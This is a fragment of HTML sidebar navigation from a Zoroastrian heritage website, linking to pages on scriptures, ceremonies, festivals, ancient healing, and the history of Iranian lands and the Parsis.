<p class="sidebar1"><a title="Cypress at Abarkuh / Abarqu" href="http://www.heritageinstitute.com/zoroastrianism/worship/herishtabarkuh.htm#abarkuh">- Cypress at Abarkuh / Abarqu</a></p>
<p class="sidebar1"><b><a title="Zoroastrian Pilgrimage sites at Udvada, India" href="http://www.heritageinstitute.com/zoroastrianism/worship/udvada.htm">Udvada, India</a></b></p>
<!--webbot bot="Include" i-checksum="9811" endspan --><br>

<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesScripture.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian scriptures. Avestan Texts & Languages" href="contents_scriptures.htm">Scriptures - Avesta & Language</a></h2>
<p class="sidebar1"><a title="Avesta Texts" href="scriptures/index.htm">Avesta Texts</a></p>
<p class="sidebar1"><a title="Avesta Compilation & Destruction" href="scriptures/history.htm">Avesta Compilation &amp; Destruction</a></p>
<p class="sidebar1"><a title="Scripture Selections" href="scriptures/selections.htm">Scripture Selections</a></p>
<p class="sidebar1"><a title="Gatha Composition by M. Schwartz (pdf)" href="pdf/Schwartz.pdf">Gatha Composition by M. Schwartz (pdf)</a></p>
<p class="sidebar1"><a title="Avestan manuscripts" href="scriptures/manuscripts.htm">Manuscripts</a></p>
<p class="sidebar1"><a title="Languages of the Avesta. Indo-Iranian Languages" href="languages/index.htm">Avestan, Iranian, Persian Languages</a></p>
<p class="sidebar1"><a title="Aramaic. Official Achaemenian Language. Pahlavi & Avestan Script Origins" href="languages/aramaic.htm">Aramaic</a></p>
<p class="sidebar1"><a title="Old Persian Discovery & Decipherment" href="languages/oldPersian.htm">Old Persian Discovery & Decipherment</a></p>
<p class="sidebar1"><a title="Teach Yourself Avestan by Dr. Ervad Ramiyar Parvez Karanjia" href="http://www.heritageinstitute.com/zoroastrianism/pdf/avestanKaranjia.pdf">Dr. Karanjia's Teach Yourself Avestan (pdf)</a></p>
<p class="sidebar1"><a title="Dari Language Project by Annahita Farudi & Doustdar Toosarvand at Berkely" href="pdf/dari.pdf">Dari - Farudi & Toosarvand (pdf)</a></p>
<!--webbot bot="Include" i-checksum="62965" endspan --><br> 
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesCeremonies.shtml" TAG="BODY" startspan -->
<h2><a title="Zoroastrian Liturgical, Purification, Initiation, Thanksgiving, Commemoration, Marriage & Death Ceremonies" href="contents_ceremonies.htm">Ceremonies. Rites of Passage</a></h2>
<p class="sidebar1"><a title="Zoroastrian Liturgical Ceremonies. Ceremonies of the inner and outer circles" href="ceremonies/liturgy.htm">Liturgical Ceremonies</a></p>
<p class="sidebar1"><a title="Zoroastrian Purification Ceremonies. Purification, Nahan, Achu Michu, Esfand, Evil Eye" href="purification/index.htm">Purification, Nahan, Achu Michu, Esfand, Evil Eye</a></p>
<p class="sidebar1"><a title="Sace / Ses Ceremonial Tray, Items and Contents" href="ceremonies/sace.htm">Sace / Ses Ceremonial Tray</a></p>
<p class="sidebar1"><a title="Navjote - initiation and coming of age ceremony" 					href="navjote/index.htm">Navjote, Sudreh Pooshi. Initiation</a></p>
<p class="sidebar1"><a title="Sudrah / Sudre / Sudreh and Kusti / Kushti" 					href="navjote/index.htm#sudrah_kusti">Sudrah/Sudre/Sudreh and Kusti/Kushti</a></p>
<p class="sidebar1"><a title="Jashan / Jashne: thanksgiving and commemoration ceremonies" 		href="jashan/index.htm">Jashan / Jashne - Thanksgiving Ceremonies</a></p>
<p class="sidebar1"><a title="Marriage ceremonies. Indian (Parsi and Irani) and Iranian based" 	href="marriage/index.htm">Marriage</a></p>
<p class="sidebar1"><a title="Indian Zoroastrian wedding (Lagan) customs" 						href="marriage/indian/index.htm">- Indian Weddings</a></p>
<p class="sidebar1"><a title="Yazdi Iranian Zoroastrian wedding customs. customs" 				href="marriage/iranian/index.htm">- Yazdi Iranian Weddings</a></p>
<p class="sidebar1"><a title="Modern Iranian Zoroastrian wedding (Aghd & Jashne Aroosi) customs" href="marriage/iranian/page2.htm">- Modern Iranian Weddings</a></p>
<p class="sidebar1"><a title="Death & funeral ceremonies. Introduction" 						href="death/index.htm">Funeral Customs</a></p>
<p class="sidebar1"><a title="Life after death. Fate of the Soul. Eschatology" 					href="death/index.htm">- Fate of the Soul. Eschatology</a></p>
<p class="sidebar1"><a title="Death & funeral ceremonies" 										href="death/page2.htm">- Death Ceremonies</a></p>
<p class="sidebar1"><a title="Mortuaries, Methods, Towers of Silence" 							href="death/page3.htm">- Mortuaries, Methods, Towers of Silence</a></p>
<p class="sidebar1"><a title="Ossuaries" 														href="death/ossuary.htm">- Ossuaries</a></p>
<!--webbot bot="Include" i-checksum="20440" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesFestival.shtml" TAG="BODY" startspan -->
<h2><a title="Festivals & Zoroastrian Calendars" href="contents_festivals.htm">Festivals. Calendar</a></h2>
<p class="sidebar1"><a title="March 21 celebrations and significance" href="nowruz/index.htm">New Year - Nowruz</a></p>
<p class="sidebar1"><a title="March 21 celebrations and significance" href="nowruz/nowruz2.htm">- Pre-Nowruz Festivities</a></p>
<p class="sidebar1"><a title="March 21 celebrations and significance" href="nowruz/nowruz3.htm">- Nowruz Day Table & Customs</a></p>
<p class="sidebar1"><a title="From Omar Khayyam's Rubaiyat translated by Fitzgerald" href="khayyam/index.htm">Fire of Spring - Omar Khayyam</a></p>
<p class="sidebar1"><a title="Parsi Shenshai New Year's Eve" href="pateti/index.htm">New Year's Eve - Pateti</a></p>
<p class="sidebar1"><a title="Seasonal festivals that celebrate and build community" href="gahambar/index.htm">Gahambar / Gahanbar -<br> &nbsp;&nbsp;&nbsp; Building Community</a></p>
<p class="sidebar1"><a title="Jashne Sadeh" href="http://www.heritageinstitute.com/zoroastrianism/worship/fire.htm#sadeh">Jashne Sadeh at Fire & Light</a></p>
<p class="sidebar1"><a title="Jashne Tirgan" href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#t">Jashne Tirgan at Calendar Grid</a></p>
<p class="sidebar1"><a title="Jashne Yalda" href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#y">Jashne Yalda at Calendar Grid</a></p>
<p class="sidebar1"><a title="Annual Festivals Calendar" href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#calendar">Annual Festivals Calendar</a></p>
<p class="sidebar1"><a title="Fasli, Shenshai, Kadmi/Qadimi calendars" href="http://www.heritageinstitute.com/zoroastrianism/calendar/index.htm">Calendar</a></p>
<p class="sidebar1"><a title="365-Day Calendar Grid" href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm">365-Day Calendar Grid</a></p>
<p class="sidebar1"><a title="Fasli, Shenshai, Kadmi/Qadimi Monthly Calendar Grids" href="http://www.heritageinstitute.com/zoroastrianism/calendar/page3.htm">Monthly Calendar Grids</a></p>
<p class="sidebar1"><a title="True Zoroastrian Year by Behram Pithavala" href="http://www.heritageinstitute.com/zoroastrianism/pdf/pithavala.pdf">Pithavala's Zoroastrian Year (pdf)</a></p>
<!--webbot bot="Include" i-checksum="19780" endspan --><br>
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepagesHealing.shtml" TAG="BODY" startspan -->
<h2><a title="Baresman and Haoma - Ancient Healing" href="http://www.heritageinstitute.com/zoroastrianism/contents_healing.htm">Ancient Healing</a></h2>
<p class="sidebar1"><a title="Zoroastrian Healing Concepts - Holistic Healing" href="http://www.heritageinstitute.com/zoroastrianism/healing/index.htm">Zoroastrian Healing Concepts</a></p>
<p class="sidebar1"><a title="Baresman, Baresma, Barsom - Ancient Healing" href="http://www.heritageinstitute.com/zoroastrianism/barsom/index.htm">Baresman (Barsom)</a></p>
<p class="sidebar1"><a title="Haoma, Hom - Ancient Healing" href="http://www.heritageinstitute.com/zoroastrianism/haoma/index.htm">Haoma (Hom)</a></p>
<p class="sidebar1"><a title="Healing Prayer, Manthra & the Spirit, Holistic Healing, Attainment of Ushta" href="http://www.heritageinstitute.com/zoroastrianism/worship/healingprayer.htm">Healing Prayer</a></p>
<p class="sidebar1"><a title="Useful Plants and Drugs of Iran and Iraq by David Hooper 1937 (pdf file)" href="http://www.heritageinstitute.com/zoroastrianism/pdf/usefulPlantsOfIranIraq.pdf">Useful Plants of Iran (pdf file)</a></p>
<p class="sidebar1"><a title="Persian Gardens, Cyrus' Gardens at Pasargadae, pairidaeza, baghs" href="http://www.heritageinstitute.com/zoroastrianism/garden/index.htm">Persian Gardens</a></p>
<!--webbot bot="Include" i-checksum="43648" endspan --><br>
</td>

<td class="col_A">
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages11History.shtml" TAG="BODY" startspan -->
<h2><a title="History of Zoroastrianism. People, lands, nations, rulers" href="contents_history.htm">Early History<br>Avestan Aryan Nations</a></h2>

<p class="sidebar1"><b><a title="Prehistory of Greater Old Iran" 									href="prehistoricsites/dawn.htm">Prehistory</a></b></p>
<p class="sidebar1"><a title="Dawn of History - Greater Old Iran's Early Peoples" 					href="prehistoricsites/dawn.htm">- Dawn of History. Early Peoples</a></p>
<p class="sidebar1"><a title="Cave Dwellings of Greater Old Iran" 									href="cavedwellings/index.htm">- Cave Dwellings of Old Iran</a></p>
<p class="sidebar1"><a title="Cave Dwelling of Shanidar" 											href="cavedwellings/shanidar.htm">- Cave Dwelling of Shanidar</a></p>
<p class="sidebar1"><a title="Prehistoric Sites - Iran & Environs" 									href="prehistoricsites/index.htm">- Prehistoric Sites - Iran & Environs</a></p>
<p class="sidebar1"><a title="Jiroft - Historical Site"					 							href="kerman/jiroft.htm">- Jiroft - Historical Site</a></p>
<p class="sidebar1"><a title="nisa/anau.htm"							 							href="nisa/anau.htm">- Nisaya (Nisa). Anau</a></p>

<p class="sidebar1"><b><a title="Who were the Aryans?" 												href="aryans/index.htm">Aryans</a></b></p>
<p class="sidebar1"><a title="Aryan Prehistory from the Stone to Iron Ages" 						href="aryans/prehistory.htm">- Aryan Prehistory</a></p>
<p class="sidebar1"><a title="Legendary Aryan Kings. Kayanian Dynasty" 								href="legendary/index.htm">- Legendary History</a></p>
<p class="sidebar1"><a title="Pre-Zoroastrian Aryan Religions & Religious Wars" 					href="aryans/religion.htm">- Aryan Religions & Wars</a></p>
<p class="sidebar1"><a title="Aryan Homeland, Airyana Vaeja in the Avesta" 							href="aryans/airyanavaeja.htm">- Aryan Homeland in Scripture</a></p>
<p class="sidebar1"><a title="Aryan Trade and Zoroastrianism. Silk Roads" 							href="aryans/trade.htm">- Aryan Trade</a></p>
<p class="sidebar1"><a title="Aryan Homeland (Airyana Vaeja) Location" 								href="aryans/location.htm">- Aryan Homeland Location</a></p>
<p class="sidebar1"><a title="Western Views on Aryans" 												href="aryans/western.htm">- Western Views on Aryans</a></p>

<p class="sidebar1"><b><a title="Pamirs, Badakhshan & Zoroastrian History" 							href="tajikistan/page3.htm">Pamir-Badakshan Region</a></b></p>
<p class="sidebar1"><a title="Pamiri Houses" 														href="tajikistan/page4.htm">- Pamiri Houses</a></p>
<p class="sidebar1"><a title="Pamiri Historical Sites" 												href="tajikistan/page5.htm">- Pamiri Historical Sites</a></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Turan & Sughdha, Sugd, Sogdiana" 			href="sugd/index.htm">Turan & Sugd (Sogdiana)</a></b></p>
<p class="sidebar1"><a title="Early Zoroastrian lands. Turan"							 			href="sugd/index.htm">- Turan</a></p>
<p class="sidebar1"><a title="Aryan / Sogdian Trade. Silk Roads. China & Zoroastrianism" 			href="sugd/trade.htm">- Sogdian Trade. Silk Roads. China</a></p>
<p class="sidebar1"><a title="Early Zoroastrian lands. Sugd (Uzbekistan)"				 			href="sugd/sugd.htm">- Sugd (Uzbekistan)</a></p>
<p class="sidebar1"><a title="Early Zoroastrian lands. Sugd (Tajikistan)" 							href="tajikistan/page2.htm">- Sugd (Tajikistan)</a></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Mouru, Margiana" 							href="merv/gonur.htm">Mouru (Margiana)</a></b></p>
<p class="sidebar1"><a title="Early Zoroastrian lands. Gonur" 										href="merv/gonur.htm">- Gonur</a></p>
<p class="sidebar1"><a title="Early Zoroastrian lands. Merv" 										href="merv/merv.htm">- Merv</a></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Bakhdhi, Bactria" 						href="balkh/index.htm">Bakhdhi (Bactria)</a></b></p>
<p class="sidebar1"><a title="Ai Khanum" 															href="balkh/AiKhanum.htm">- Ai Khanum</a></p>
<p class="sidebar1"><a title="Sheberghan & Yemshi Tepe" 											href="balkh/talayehtepe.htm">- Sheberghan & Yemshi Tepe</a></p>
<p class="sidebar1"><a title="Talayeh Tepe / Tillya Tepe" 											href="balkh/talayehtepe.htm">- Talayeh Tepe / Tillya Tepe</a></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Nisaya, Nisa, Anau" 						href="nisa/anau.htm">Nisaya (Nisa). Anau</a></b></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Parthava (Parthia)" 						href="parthia/index.htm">Parthava (Parthia)</a></b></p>
<p class="sidebar1"><a title="Region & People" 														href="parthia/region.htm">- Region & People</a></p>
<p class="sidebar1"><a title="Historical Milestones" 												href="parthia/milestones.htm">- Historical Milestones</a></p>
<p class="sidebar1"><a title="Historical Places"						 							href="parthia/places.htm">- Historical Places</a></p>
<p class="sidebar1"><b><a title="Early Zoroastrian lands. Haroyu (Aria)" 							href="aria/index.htm">Haroyu (Aria)</a></b></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Khairizem, Khvarizem, Chorasmia" 			href="khvarizem/index.htm">Khvarizem (Chorasmia)</a></b></p>
<p class="sidebar1"><a title="Location. Saka. Turks" 												href="khvarizem/index.htm">- Location. Saka. Turks</a></p>
<p class="sidebar1"><a title="Chilpik Dakhma, Mizdakan, Gyaur Kala and others" 						href="khvarizem/page2.htm">- Dakhma & Kalas</a></p>
<p class="sidebar1"><a title="Ayaz Kalas" 															href="khvarizem/page3.htm">- Ayaz Kalas</a></p>
<p class="sidebar1"><a title="Fire Temple, Kazakl'i-yatkan, Tash-K'irman-Tepe & other Kalas" 		href="khvarizem/page4.htm">- Fire Temples & Kalas</a></p>

<p class="sidebar1"><b><a title="Early Zoroastrian lands. Varkana (Hyrcania)" 						href="varkana/index.htm">Varkana (Hyrcania)</a></b></p>

<p class="sidebar1"><b><a title="Saka. Fergana, Scythia, Turks" 									href="saka/index.htm">Saka. Fergana, Scythia, Turks</a></b></p>
<p class="sidebar1"><a title="Location. Saka. Turks" 												href="saka/index.htm">- Saka, Pathia, Dahi, Sistan, Scythia</a></p>
<p class="sidebar1"><a title="Nomads, Predators, Paraetaceni" 										href="saka/saka2.htm">- Nomads, Predators, Paraetaceni</a></p>
<p class="sidebar1"><a title="Tigrakhauda, Haumavarga, Fergana, Women" 								href="saka/saka3.htm">- Tigrakhauda, Haumavarga, Fergana, Women</a></p>
<p class="sidebar1"><a title="Paradarya, Turks, Turan" 												href="saka/saka4.htm">- Paradarya, Turks, Turan</a></p>


<p class="sidebar1"><b><a title="Dahi (Dahistan)" href="dahi/index.htm">Dahi (Dahistan)</a></b></p>
<p class="sidebar1"><a title="Ancient Dahi & Location" href="dahi/index.htm">- Ancient Dahi & Location</a></p>
<p class="sidebar1"><a title="Dahistan & Misriyan" href="dahi/dahistan.htm">- Dahistan & Misriyan</a></p>
<p class="sidebar1"><b><a title="Far Eastern Lands. Phryni & Seres, Tashkurgan, Khotan, Kashgar, Yarkand" href="east/index.htm">Far Eastern Lands</a></b></p>
<p class="sidebar1"><a title="Ancient Dahi & Location" href="east/index.htm#easternextent">- Tashkurgan, Khotan, Tochari</a></p>
<p class="sidebar1"><a title="Ancient Dahi & Location" href="east/index.htm#seresphryni">- Phryni & Seres</a></p>
<p class="sidebar1"><a title="Ancient Dahi & Location" href="east/east2.htm#kushan">- Kushan</a></p>
<p class="sidebar1"><a title="Ancient Dahi & Location" href="east/east2.htm#chionites">- Chionites</a></p>
<p class="sidebar1"><a title="Ancient Dahi & Location" href="east/east2.htm#hephthalite">- Heptalon / Hephthalite</a></p>

<p class="sidebar1"><b><a title="Ranghaya & Western Aryan Lands" href="ranghaya/index.htm">Ranghaya & Western Aryan Lands</a></b></p>
<p class="sidebar1"><a title="Ranghaya & Western Aryan Lands" href="ranghaya/index.htm">- Ranghaya & Kurdistan</a></p>
<p class="sidebar1"><a title="Mitanni" href="ranghaya/mitanni.htm">- Mitanni</a></p>
<p class="sidebar1"><a title="Hittites" href="ranghaya/hittites.htm">- Hittites</a></p>
<p class="sidebar1"><a title="Suppiluliuma (Hittite) Shattiwaza (Mitanni) Treaty.htm" href="ranghaya/suppiluliuma_shattiwaza_treaty.htm">- Hittite Mitanni Treaty</a></p>
<h2>The Missing Years</h2>
<p class="sidebar1"><b><a title="Urmia. Persian & Median Prehistory" href="urmia/index.htm">Urmia, N. Zagros (Azerbaijan)</a></b></p>
<p class="sidebar1"><a title="Kassites" href="urmia/index.htm">- Azerbaijan, Urmia, N.Zagros</a></p>
<p class="sidebar1"><a title="Kassites" href="urmia/index.htm#shiz">- Azargoshasb Temple Site</a></p>
<p class="sidebar1"><a title="Kassites" href="temples/index.htm#surakhani">- Temple at Surakhani, Azerbaijan</a></p>
<p class="sidebar1"><a title="Kassites" href="urmia/kandovan-2.htm">- Kandovan Cave Village Introduction</a></p>
<p class="sidebar1"><a title="Kassites" href="urmia/kandovan.htm">- Kandovan Cave Village Photo Tour</a></p>
<p class="sidebar1"><b><a title="Zagros region & Parsua. Persian & Median Prehistory" href="zagros/index.htm">Zagros, Parsua</a></b></p>
<p class="sidebar1"><a title="Kassites" href="ranghaya/kassites.htm">- Kassites</a></p>

<h2>Median & Persian History</h2>

<p class="sidebar1"><b><a title="Mada - Medes & Media" href="http://www.heritageinstitute.com/zoroastrianism/medians/index.htm">Mada - Medes & Media</a></b></p>

<p class="sidebar1"><b><a title="Formation of Persia and the Achaemenian Dynasty"  href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/index.htm">Early Persian & Achaemenian History</a></b></p>
<p class="sidebar1"><a title="Cyrus the Great and liberator. Achaemenian Dynasty" href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/cyrus.htm">Cyrus the Great</a></p>
<p class="sidebar1"><a title="Pasargadae, Capital of Cyrus the Great" href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/pasargadae.htm">- Pasargadae</a></p>
<p class="sidebar1"><a title="Kabujiya / Cambyses II & Gaumata" href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/cambyses.htm">Cambyses II & Gaumata</a></p>
<p class="sidebar1"><a title="Darius / Darayavaush I (the Great)" href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/darius.htm">Darius I, the Great</a></p>
<p class="sidebar1"><a title="Persepolis, Ancient capital of the Persian Achaemenian empire" href="http://www.heritageinstitute.com/zoroastrianism/persepolis/index.htm">Persepolis, Achaemenian Capital</a></p>
<p class="sidebar1"><a title="Persepolis, Gate & Hall" href="http://www.heritageinstitute.com/zoroastrianism/persepolis/persepolis2.htm">- Gate & Hall</a></p>
<p class="sidebar1"><a title="Persepolis, Palace"	href="http://www.heritageinstitute.com/zoroastrianism/persepolis/persepolis3.htm">- Palace</a></p>
<p class="sidebar1"><a title="Persepolis, Destruction by Alexander"	href="http://www.heritageinstitute.com/zoroastrianism/persepolis/destruction.htm">- Destruction</a></p>
<p class="sidebar1"><a title="Videos - Persepolis Reconstructed"	href="http://www.heritageinstitute.com/zoroastrianism/persepolis/videos.htm">- Videos - Persepolis Reconstructed</a></p>
<p class="sidebar1"><a title="Videos - Achaemenian Empire" href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/video.htm">Videos - Achaemenian Empire</a></p>

<p class="sidebar1"><b><a title="Nigin Miri's Historical Geography of Fars during the Sasanian Period" href="http://www.heritageinstitute.com/zoroastrianism/pdf/sasanika.pdf">Sassanian History</a></b></p>
<p class="sidebar1"><a title="Nigin Miri's Historical Geography of Fars during the Sasanian Period" href="http://www.heritageinstitute.com/zoroastrianism/pdf/sasanika.pdf"> - Nigin Miri's Sassanian Fars (pdf)</a></p>

<p class="sidebar1"><a title="Naqsh-e Rustam, Location & Elamite Reliefs" href="http://www.heritageinstitute.com/zoroastrianism/naqsherustam/index.htm">Naqsh-e Rustam Historical Site</a></p>
<p class="sidebar1"><a title="Naqsh-e Rustam, Achaemenian Tombs & Sassanian Reliefs" href="http://www.heritageinstitute.com/zoroastrianism/naqsherustam/page2.htm"> - Achaemenians Tombs & Sassanian Reliefs</a></p>
<p class="sidebar1"><a title="Behistun Historical Site" href="http://www.heritageinstitute.com/zoroastrianism/behistun/index.htm">Behistun Historical Site</a></p>
<p class="sidebar1"><a title="Susa Historical Site" href="http://www.heritageinstitute.com/zoroastrianism/susa/index.htm">Susa Historical Site</a></p>
<p class="sidebar1"><a title="Ancient Rulers of Iran - Timelines" href="http://www.heritageinstitute.com/zoroastrianism/history/timelines.htm">Rulers - Timelines</a></p>
<p class="sidebar1"><a title="The names Iran and Persia explained" href="http://www.heritageinstitute.com/zoroastrianism/iranpersia/index.htm">Iran and Persia - The Same?</a></p>

<p class="sidebar1"><b><a title="Greek Persian Connections" href="olympicflame/page2.htm">Greek Persian Connections</a></b></p>
<p class="sidebar1"><a title="Legendary Greek Persian Connections" href="olympicflame/page2.htm">- Legendary Connections</a></p>
<p class="sidebar1"><a title="Achaemenian Era Connections" href="achaemenian/darius2.htm#greekallies">- Achaemenian Era Relations & Wars</a></p>
<h2>Post 650 CE History</h2>

<p class="sidebar1"><a title="Arabs & Resistance to Arabs" href="http://www.heritageinstitute.com/zoroastrianism/history/islamichistory1.htm"><b>Arabs & Resistance to Arabs</b></a></p>
<p class="sidebar1"><a title="Early Islamic History - Prelude to the Arab Invasion of Iran Shahr" href="http://www.heritageinstitute.com/zoroastrianism/history/islamichistory1.htm">- Early Islamic History - Prelude to the Arab Invasion of Iran Shahr</a></p>
<p class="sidebar1"><a title="Fight & Flight - Iranian Resistance to the Arabs" href="http://www.heritageinstitute.com/zoroastrianism/history/fightflight.htm">- Fight & Flight - Iranian Resistance to the Arabs</a></p>
<p class="sidebar1"><a title="Abu Muslim - Zoroastrian Enigma" href="http://www.heritageinstitute.com/zoroastrianism/history/abumuslim.htm">- Abu Muslim - Zoroastrian Enigma</a></p>
<p class="sidebar1"><a title="Revolutionary Zoroastrian Sects" href="http://www.heritageinstitute.com/zoroastrianism/sects/index.htm">- Revolutionary Zoroastrian Sects</a></p>
<p class="sidebar1"><a title="Revolutionary Zoroastrian Sects" href="http://www.heritageinstitute.com/zoroastrianism/sects/index.htm">- Babak Khorramdin</a></p>

<p class="sidebar1"><b><a title="Conditions for Zoroastrian in Post Arab Iran" href="http://www.heritageinstitute.com/zoroastrianism/history/postArab.htm">Conditions for Zoroastrian in Post Arab Iran</a></b></p>


<p class="sidebar1"><a title="Conditions 1500s-1800s" href="http://www.heritageinstitute.com/zoroastrianism/history/postArab.htm">- Conditions 650-1400s</a></p>

<p class="sidebar1"><a title="Conditions 1500s-1800s" href="http://www.heritageinstitute.com/zoroastrianism/history/postArab.htm">- Conditions 650-1400s</a></p>
<p class="sidebar1"><a title="Conditions 1500s-1800s" href="http://www.heritageinstitute.com/zoroastrianism/history/postArab1.htm">- Conditions 1500s-1800s</a></p>
<p class="sidebar1"><a title="Renaissance. Benefactors. Zoroastrian Cooperation" href="http://www.heritageinstitute.com/zoroastrianism/history/postArab2.htm">- Renaissance. Benefactors</a></p>
<p class="sidebar1"><a title="Renaissance. Benefactors. Parsi Assistance" href="http://www.heritageinstitute.com/zoroastrianism/history/postArab2.htm">- Parsi Assistance</a></p>

<h2>Parsees & Parsi History</h2>
<p class="sidebar1"><a title="Early Parsi History" href="http://www.heritageinstitute.com/zoroastrianism/history/qissa1.htm">Early Parsi History</a></p>
<p class="sidebar1"><a title="Escape from Iran" href="http://www.heritageinstitute.com/zoroastrianism/history/qissa1.htm">- Escape from Iran</a></p>
<p class="sidebar1"><a title="Landing & Settlement at Sanjan" href="http://www.heritageinstitute.com/zoroastrianism/history/qissa2.htm">- Landing & Settlement at Sanjan</a></p>
<p class="sidebar1"><a title="Destruction of Sanjan" href="http://www.heritageinstitute.com/zoroastrianism/history/qissa3.htm">- Destruction of Sanjan</a></p>
<p class="sidebar1"><a title="Parsi Settlement of India's Westcoast" href="http://www.heritageinstitute.com/zoroastrianism/parsi/westcoast.htm">Settlement of India's Westcoast</a></p>
<p class="sidebar1"><a title="Parsi Settlement of Konkan Thana" href="http://www.heritageinstitute.com/zoroastrianism/parsi/konkan_thana.htm">Settlement of Konkan Thana</a></p>
<p class="sidebar1"><a title="Parsi Settlement of Konkan Thana" href="http://www.heritageinstitute.com/zoroastrianism/parsi/surat1.htm">Parsees & Surat's Development</a></p>
<!--  
<p class="sidebar1"><a title="Parsi Settlement & Development of Bombay (Mumbai)" href="http://www.heritageinstitute.com/zoroastrianism/parsi/bombay.htm">Settlement & Development of Bombay (Mumbai)</a></p>
-->

<p class="sidebar1"><a title="Hodivala's Studies in Parsi History" href="http://www.heritageinstitute.com/zoroastrianism/pdf/parsi/hodivala.pdf">Hodivala's Studies in Parsi History (pdf)</a></p>
<p class="sidebar1"><a title="Karaka's The Parsees" href="http://www.heritageinstitute.com/zoroastrianism/pdf/parsi/KarakaTheParsees.pdf">Karaka's The Parsees (pdf)</a></p>
<p class="sidebar1"><a title="Karaka's History of the Parsis Vol. II pdf" href="http://www.heritageinstitute.com/zoroastrianism/pdf/parsi/KarakaHistoryOfTheParsisVol2.pdf">Karaka's History of the Parsis Vol. II (pdf)</a></p>
<p class="sidebar1"><a title="Dosabhoy Framjee: Parsees, Their History, Manners, Customs, and Religion" href="http://www.heritageinstitute.com/zoroastrianism/pdf/parsi/NatGeographicParsees.pdf">Dosabhoy Framjee: Parsees, Their History, Manners, Customs, and Religion (pdf)</a></p>
<p class="sidebar1"><a title="National Geographic Article on the Parsees 1905 - by William Thomas Fee" href="http://www.heritageinstitute.com/zoroastrianism/pdf/parsi/NatGeographicParsees.pdf">Parsees: National Geographic 1905 (pdf)</a></p>


<!--webbot bot="Include" i-checksum="17770" endspan --></td>

<td class="col_A">
<!--webbot bot="Include" U-Include="included_content/sitepages/sitepages11aHistory.shtml" TAG="BODY" startspan -->
<h2><a title="History of Zoroastrianism. People, lands, nations, rulers" href="contents_history.htm">History - Modern Regions</a></h2>

<p class="sidebar1"><b><a title="Urmia. Persian & Median Prehistory" href="urmia/index.htm">Azerbaijan, Urmia, N. Zagros</a></b></p>
<p class="sidebar1"><a title="Temple at Surakhani, Azerbaijan" href="temples/index.htm#surakhani">- Temple at Surakhani, Azerbaijan</a></p>
<p class="sidebar1"><a title="Azargoshasb Temple Site, Shiz (Takht-e Suleiman), West Azerbaijan" href="urmia/index.htm#shiz">- Azargoshasb Temple Site</a></p>
<p class="sidebar1"><a title="Kandovan - troglodyte village" href="urmia/kandovan.htm">- Kandovan - Troglodyte Village</a></p>

<p class="sidebar1"><b><a title="Hormozgan's History & Zoroastrian Connections" href="hormozgan/index.htm">Hormozgan</a></b></p>
<p class="sidebar1"><a title="Hormozgan's History & Zoroastrian Connections" href="hormozgan/index.htm">- History & Zoroastrian Connections</a></p>
<p class="sidebar1"><a title="Trade, Traders & Travellers" href="hormozgan/tradeTravellers.htm">- Trade, Traders & Travellers</a></p>
<p class="sidebar1"><a title="People & Places. Pg 1 incl. Minab, Old Hormuz" href="hormozgan/index.peoplePlaces1">- People & Places. Pg 1 incl. Minab, Old Hormuz</a></p>
<p class="sidebar1"><a title="People & Places. Pg 2 incl. Hormuz Island, Nature's Colour Palette Yemen, Oman" href="hormozgan/peoplePlaces2.htm">- People & Places. Pg 2 incl. Hormuz Island,<br>&nbsp;&nbsp;Nature's Colour Palette Yemen, Oman</a></p>

<p class="sidebar1"><b>Kerman Region</b></p>
<p class="sidebar1">&nbsp; <a title="Kerman Region. History. Land" href="http://www.heritageinstitute.com/zoroastrianism/kerman/index.htm">- Kerman Region. History. Land</a></p>
<p class="sidebar1">&nbsp; <a title="Kerman Region. Maymand - Troglodyte Village" href="http://www.heritageinstitute.com/zoroastrianism/kerman/maymand.htm">- Maymand - Troglodyte Village</a></p>
<p class="sidebar1">&nbsp; <a title="Jiroft Kerman Historical Site" href="http://www.heritageinstitute.com/zoroastrianism/kerman/jiroft.htm">- Jiroft Kerman Historical Site</a></p>

<p class="sidebar1"><b><a title="Khorasan / Kuhistan" href="http://www.heritageinstitute.com/zoroastrianism/khorasan/index.htm">Khorasan / Kuhistan</a></b></p>

<p class="sidebar1"><a title="Khorasan" href="http://www.heritageinstitute.com/zoroastrianism/khorasan/index.htm">- Kuhistan</a></p>


<p class="sidebar1"><b><a title="Yazd Region & Zoroastrian History" href="http://www.heritageinstitute.com/zoroastrianism/yazd/index.htm">Yazd Region</a></b></p>
<p class="sidebar1"><a title="Yazd Region & Zoroastrian History. History. Land. Yazd City" href="http://www.heritageinstitute.com/zoroastrianism/yazd/index.htm">- Yazd Region. History. Land. Yazd City</a></p>
<p class="sidebar1">&nbsp; <a title="Innovative Technologies. Kareez, AbAnbar, Badgir" href="http://www.heritageinstitute.com/zoroastrianism/yazd/page2.htm">- Innovative Technologies</a></p>
<p class="sidebar1">&nbsp; <a title="Zoroastrianism in Yazd. Dari, Turkabad, Sharifabad, Temples, Dakhma" href="http://www.heritageinstitute.com/zoroastrianism/yazd/zoroastrian.htm">- Zoroastrianism in Yazd</a></p>
<p class="sidebar1">&nbsp; <a title="Yazd Zoroastrian Schools. Markerabad. Pioneers: Maneckji Hataria, Pestonji Marker,<br>&nbsp; Mirza Soroush Lohrasp" href="http://www.heritageinstitute.com/zoroastrianism/yazd/schools.htm">- Yazd Schools. Markerabad</a></p>

